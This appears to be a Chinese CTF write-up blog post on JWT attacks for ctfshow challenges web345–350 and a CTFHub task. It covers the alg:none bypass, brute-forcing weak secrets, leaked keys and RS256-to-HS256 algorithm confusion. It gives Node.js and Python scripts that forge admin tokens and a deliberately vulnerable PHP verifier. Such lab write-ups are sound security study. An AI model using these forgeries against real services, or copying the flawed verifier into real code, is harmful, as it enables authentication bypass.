---
title: "JWT"
date: 2024-10-28
---
# JWT

## web345

无加密

```json
{
  "alg": "None",
  "typ": "jwt"
}

[
  {
    "iss": "admin",
    "iat": 1730091703,
    "exp": 1730098903,
    "nbf": 1730091703,
    "sub": "user",
    "jti": "194c0c579a5354abe3237f476bfa5eb5"
  }
]
```

修改

- "alg": "hs256"
- "sub": "admin"

访问url/admin/

## web346

将alg修改为none后，去掉JWT中的signature数据(仅剩header+'+ payload+.)然后提交到服务端即可

```json
{
  "alg": "None",
  "typ": "jwt"
}

[
    {
        "iss":"admin",
        "iat":1730094048,
        "exp":1730101248,
        "nbf":1730094048,
        "sub":"admin",
        "jti":"fbc9de81e7cff1ddd73cb9f3dc2c489a"
    }
]

```

## web347

弱口令爆破

[JWT_GUI离线图形化工具](https://github.com/Aiyflowers/JWT_GUI)

这个工具能解决web345-349
[离线图形化JWT加解密爆破工具JWT_GUI（ctfshowweb345——350）](https://blog.csdn.net/Boyfml/article/details/131901992)

## web348

爆破
c-jwt-cracker

```bash
./jwtcrack <jwt>
```

## web349

公私钥泄露
在jwt.io中分别把公私钥复制进去，然后替换Cookie即可

## web350

公钥泄露
非对称加密转对称加密

```js
const jwt = require('jsonwebtoken');
const fs = require('fs');

var privateKey = fs.readFileSync(process.cwd()+'\\public.key');
// console.log(privateKey);

var token = jwt.sign({ user: 'admin' }, privateKey, { algorithm: 'HS256' });
console.log(token)
```

## CTFHUB JWT 修改签名算法

使用非对称密码算法时，有时攻击者可以获取到公钥，此时可通过修改JWT头部的签名算法，将非对称密码算法改为对称密码算法，从而达到攻击者目的

题目

```php
<?php
require __DIR__ . '/vendor/autoload.php';
use \Firebase\JWT\JWT;

class JWTHelper {
  public static function encode($payload=array(), $key='', $alg='HS256') {
    return JWT::encode($payload, $key, $alg);
  }
  public static function decode($token, $key, $alg='HS256') {
    try{
            $header = JWTHelper::getHeader($token);
            $algs = array_merge(array($header->alg, $alg));
      return JWT::decode($token, $key, $algs);
    } catch(Exception $e){
      return false;
    }
    }
    public static function getHeader($jwt) {
        $tks = explode('.', $jwt);
        list($headb64, $bodyb64, $cryptob64) = $tks;
        $header = JWT::jsonDecode(JWT::urlsafeB64Decode($headb64));
        return $header;
    }
}

$FLAG = getenv("FLAG");
$PRIVATE_KEY = file_get_contents("/privatekey.pem");
$PUBLIC_KEY = file_get_contents("./publickey.pem");

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (!empty($_POST['username']) && !empty($_POST['password'])) {
        $token = "";
        if($_POST['username'] === 'admin' && $_POST['password'] === $FLAG){
            $jwt_payload = array(
                'username' => $_POST['username'],
                'role'=> 'admin',
            );
            $token = JWTHelper::encode($jwt_payload, $PRIVATE_KEY, 'RS256');
        } else {
            $jwt_payload = array(
                'username' => $_POST['username'],
                'role'=> 'guest',
            );
            $token = JWTHelper::encode($jwt_payload, $PRIVATE_KEY, 'RS256');
        }
        @setcookie("token", $token, time()+1800);
        header("Location: /index.php");
        exit();
    } else {
        @setcookie("token", "");
        header("Location: /index.php");
        exit();
    }
} else {
    if(!empty($_COOKIE['token']) && JWTHelper::decode($_COOKIE['token'], $PUBLIC_KEY) != false) {
        $obj = JWTHelper::decode($_COOKIE['token'], $PUBLIC_KEY);
        if ($obj->role === 'admin') {
            echo $FLAG;
        }
    } else {
        show_source(__FILE__);
    }
}
?>
```

解题

```python
# coding=GBK
import hmac
import hashlib
import base64

file = open('publickey.pem')    #需要将文中的publickey下载	与脚本同目录
key = file.read()

# Paste your header and payload here
header = '{"typ": "JWT", "alg": "HS256"}'
payload = '{"username": "admin", "role": "admin"}'

# Creating encoded header
encodeHBytes = base64.urlsafe_b64encode(header.encode("utf-8"))
encodeHeader = str(encodeHBytes, "utf-8").rstrip("=")

# Creating encoded payload
encodePBytes = base64.urlsafe_b64encode(payload.encode("utf-8"))
encodePayload = str(encodePBytes, "utf-8").rstrip("=")

# Concatenating header and payload
token = (encodeHeader + "." + encodePayload)

# Creating signature
sig = base64.urlsafe_b64encode(hmac.new(bytes(key, "UTF-8"), token.encode("utf-8"), hashlib.sha256).digest()).decode("UTF-8").rstrip("=")

print(token + "." + sig)
```
